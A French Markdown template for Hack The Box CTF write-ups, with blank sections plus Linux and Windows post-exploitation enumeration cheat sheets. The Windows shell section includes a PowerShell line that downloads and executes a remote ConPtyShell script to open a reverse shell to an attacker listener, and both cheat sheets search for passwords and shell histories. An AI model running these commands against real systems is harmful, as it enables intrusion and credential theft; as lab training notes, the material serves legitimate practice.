---
tags:
  - htb
title:
os:
difficulty:
date:
status: en-cours
draft: "true"
---
---
# {{title}}

> [!summary] Résumé rapide  
> (Compléter après la machine : vecteur d’entrée + privesc)

---

## 🟦 Informations générales

- **Nom de la machine :** {{title}}
- **OS :**
- **Difficulty :**
- **Auteur :**
- **Date :** {{date}}
- **Statut :** (En cours / Terminée / À revoir)

---
## 🟦 1. Reconnaissance réseau


> [!info] 1.2 Nmap – Scan initial

```bash
nmap -p- <ip> --min-rate 5000
```

**Services découverts :**

> [!info] 1.3 Nmap – Scan complet

```bash
nmap -sCV (-script vuln) -p<ports1,port2,...> <ip>
```

**Infos supplémentaires :**

---
## 🟦 2. Analyse des services

### 🌐 HTTP / Web
**Technos détectées :**  
**Endpoints trouvés :**

> [!info] Fuzzing

**Hypothèses :**  
-  
-  

---

### 📁 SMB / FTP / SQL / Autres services
**Infos :**  
**Enumerations :**

> [!info] Outils utilisés  
- smbmap  
- enum4linux  
- smbclient  

**Fichiers / données récupérées :**

---

## 🟦 3. Points d’entrée potentiels

-  
-  
-  

---

## 🟦 4. Exploitation

> [!tip] 4.1 PoC

**Résultat :**  

**Accès obtenu :**  
- User :  
- Contexte :  

---

## 🟦 5. Post exploitation / Énumération locale

> [!info] Linux

> [!tip] Stabilisation du Shell
> ```bash
> # Shell
> python -c 'import pty; pty.spawn("/bin/bash")'
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> ```
> ```bash
> # Exports et alias
> export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
> export TERM=xterm-256color
> alias ll='ls -lsaht --color=auto'
> ```
> ```bash
> # Raccourcis clavier 
> # D'abord "Ctrl + Z" pour mettre en bg
> stty raw -echo; fg; reset
> stty columns 200 rows 200
> ```

✅ **1. Informations système**

```bash
# Version OS
uname -a
cat /etc/os-release

# Hostname
hostname

# Environment
env
```

✅ **2. Utilisateurs & groupes**

```bash
# Infos utilisateur courant
whoami
id

# Infos autres utilisateurs et groupes
grep -vE "nologin|false" /etc/passwd
grep "sudo|wheel" /etc/group
```

✅ **3. Processus**

```bash
# Liste des process
ps aux

# Liste des process + services
ps -ef

# Liste des process par utilisateur
ps -u <user>
```

✅ **4. Réseau**

```bash
# Configuration réseau
ip a
ip route
arp -a

# Ports TCP/UDP en cours d'utilisation
ss -tulnp
```

✅ **5. Services**

```bash
# Liste des services
systemctl list-units --type=service

# Détails d'un service
systemctl status <svc>

# Scripts d'initialisation
ls /etc/init.d
```

✅ **6. Tâches planifiées**

```bash
# Cron utilisateur
crontab -l

# Cron globaux
ls -alh /etc/cron*
```

✅ **7. Permissions / élévation d'informations**

```bash
# Droits sudo de l'utilisateur
sudo -l

# Fichiers en lecture
getcap -r / 2>/dev/null

# Fichier bit SUID/SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

✅ **8. Fichiers sensibles**

```bash
# Historique shell
cat ~/.bash_history

# Recherche de fichier de config
find / -name "*config*"

# Logs
ls -al /var/log/
```

✅ **9. Recherche de chaînes sensibles**

```bash
# Mot "pass" dans un fichier
grep -Rni "pass" . 2>/dev/null

# Mot "pass" dans le nom du fichier
find / -iname "*pass*" 2>/dev/null
```

✅ **10. Applications & logiciels installés**

```bash
# DEB
dpkg -l

# RPM
rpm -qa

# Chemin
which <prog>
```

✅ **11. Partages & ressources réseau**

```bash
# Montages
mount

# SMB
smbstatus
```


> [!info] Windows

> [!tip] Stabilisation du Shell
> https://github.com/antonioCoco/ConPtyShell
> ```bash
> # Ouvrir un serveur http pour servir le script ps1
> python3 -m http.server <port http>
> # Shell côté attaquant
> stty raw -echo; (stty size; cat) | nc -lvnp <port>
> ```
> ```powershell
> # Côté windows
> IEX(IWR https://<IP>:<port http>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <IP> <port>
> ```

✅ **1. Informations système**

```powershell
# Version OS
systeminfo
ver

# Hostname
hostname

# Environment
set
```

✅ **2. Utilisateurs & groupes**

```powershell
# Infos utilisateur courant
whoami
whoami /groups

# Infos autres utilisateurs et groupes
net user
net localgroup
net localgroup administrators
```

✅ **3. Processus**

```powershell
# Liste des process
tasklist

# Liste des process + services
tasklist /svc

# Liste des process par utilisateur
tasklist /FI "USERNAME eq <user>"
```

✅ **4. Réseau**

```powershell
# Configuration réseau
ipconfig /all
route print
arp -a

# Ports TCP/UDP en cours d'utilisation
netstat -ano
```

✅ **5. Services**

```powershell
# Liste des services
sc query

# Détails d'un service
sc query <svc>

# Scripts d'initialisation
Get-Service
```

✅ **6. Tâches planifiées**

```powershell
# Cron utilisateur
schtasks /query /fo LIST /v
```

✅ **7. Permissions / élévation d'informations**

```powershell
# Droits sudo de l'utilisateur
whoami /priv
```

✅ **8. Fichiers sensibles**

```powershell
# Historique shell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Recherche de fichier de config
dir /s /b C:\*config*

# Logs
Get-EventLog -LogName *
```

✅ **9. Recherche de chaînes sensibles**

```powershell
# Mot "pass" dans un fichier
Select-String -Path "C:\*" -Pattern "pass" -Recurse

# Mot "pass" dans le nom du fichier
Get-ChildItem -Recurse -Filter *pass*
```

✅ **10. Applications & logiciels installés**

```powershell
# Applications installées
wmic product get name,version
Get-WmiObject Win32_Product

# Chemin
where <prog>
```

✅ **11. Partages & ressources réseau**

```powershell
# Montages
net use

# SMB
net share
```


**Infos importantes :**

---

## 🟦 6. Élévation de privilèges

### Méthode retenue :
- Type :  
- Pourquoi ça marche :  
- Commande(s) / manip(s) :

**Contexte final :** root / administrator

---

## 🟦 7. Résumé final

> [!success] Ce que j’ai appris  
-  
-  

> [!failure] Ce que j’ai raté / À éviter  
-  
-  

> [!attention] Patterns utiles  
-  